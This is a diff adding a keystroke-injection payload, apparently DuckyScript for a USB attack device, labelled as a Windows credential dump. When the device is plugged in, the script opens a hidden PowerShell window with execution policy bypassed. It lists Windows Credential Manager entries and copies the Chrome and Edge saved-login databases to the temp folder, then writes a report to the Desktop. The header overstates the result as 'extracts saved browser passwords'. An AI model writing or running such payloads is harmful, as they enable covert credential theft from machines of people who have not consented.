@@ -1,0 +1,17 @@
+REM ============================================================
+REM  Windows · Credential Dump (Browser + System)
+REM ============================================================
+REM  Extracts saved browser passwords (Chrome, Edge) and Windows
+REM  credential vault entries to a file on the Desktop.
+REM
+REM  Uses only built-in PowerShell — no external tools needed.
+REM  Output: %USERPROFILE%\Desktop\cred_audit.txt
+
+DEFAULTDELAY 60
+
+GUI r
+DELAY 700
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1500
+STRINGLN $r=@('=== Credential Vault ===');$r+=cmdkey /list 2>&1;$r+='';$r+='=== Chrome Login DB ===';$cdb="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data";if(Test-Path $cdb){$tmp="$env:TEMP\ld.db";Copy-Item $cdb $tmp -Force;$r+="Copied to $tmp (use sqlite3 to read)"}else{$r+='Not found'};$r+='';$r+='=== Edge Login DB ===';$edb="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data";if(Test-Path $edb){$tmp2="$env:TEMP\eld.db";Copy-Item $edb $tmp2 -Force;$r+="Copied to $tmp2"}else{$r+='Not found'};$r|Out-File "$env:USERPROFILE\Desktop\cred_audit.txt";exit
